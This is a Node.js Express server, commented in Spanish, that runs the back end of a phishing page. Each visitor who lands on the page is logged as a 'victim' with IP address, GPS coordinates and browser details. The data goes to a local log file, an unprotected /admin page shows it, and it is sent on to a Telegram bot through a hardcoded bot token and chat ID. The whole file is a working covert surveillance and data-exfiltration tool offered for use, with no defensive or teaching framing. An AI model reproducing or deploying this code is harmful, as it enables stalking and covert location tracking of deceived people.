const express = require('express');
const axios = require('axios');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

// ⚡ TUS CREDENCIALES (REEMPLAZA ESTO)
const BOT_TOKEN = '8559209717:AAF5SsdVl67GjcFK1NUXb0jBfJ5fwKyXy-I';
const YOUR_CHAT_ID = '5728569894';

app.use(express.static('public'));

// Función para enviar alerta a Telegram
async function sendTelegramAlert(victimData) {
    const { ip, lat, lon, userAgent, referer } = victimData;
    
    const message = `🚨 **NUEVA VÍCTIMA LOCALIZADA** 🚨\n\n` +
                    `🕒 **Hora:** ${new Date().toLocaleString()}\n` +
                    `🌐 **IP:** ${ip}\n` +
                    `📍 **Coordenadas:** ${lat}, ${lon}\n` +
                    `🔗 **Referer:** ${referer || 'Direct'}\n` +
                    `📱 **User Agent:** ${userAgent}\n\n` +
                    `👉 [Ver en Google Maps](https://maps.google.com/?q=${lat},${lon})`;
    
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: YOUR_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log('[BOT] Alerta enviada a Telegram');
    } catch (error) {
        console.error('[BOT] Error:', error.message);
    }
}

// Endpoint principal de tracking
app.get('/track', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.ip || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const referer = req.headers['referer'] || 'Direct';
    const { lat, lon, acc, action } = req.query;
    
    // Datos de la víctima
    const victimData = {
        ip,
        lat: lat || 'Not provided',
        lon: lon || 'Not provided',
        accuracy: acc || 'N/A',
        userAgent,
        referer,
        action: action || 'location_click',
        timestamp: new Date().toISOString()
    };
    
    // 1. Guardar en archivo de logs
    const logEntry = `
[${new Date().toLocaleString()}]
IP: ${ip}
Location: ${lat}, ${lon} (Accuracy: ${acc} m)
User Agent: ${userAgent}
Referer: ${referer}
Action: ${action || 'click'}
────────────────────────────
`;
    fs.appendFileSync('victims.log', logEntry);
    
    // 2. Enviar alerta a Telegram
    await sendTelegramAlert(victimData);
    
    // 3. Responder al cliente
    res.json({ status: 'success', message: 'Location received' });
});

// Panel de administración (opcional)
app.get('/admin', (req, res) => {
    if (fs.existsSync('victims.log')) {
        const logs = fs.readFileSync('victims.log', 'utf8');
        res.send(`<pre>${logs}</pre>`);
    } else {
        res.send('No victims yet.');
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Tracker running on port ${PORT}`);
    console.log(`📁 Phishing page: http://localhost:${PORT}`);
    console.log(`📊 Admin panel: http://localhost:${PORT}/admin`);
});
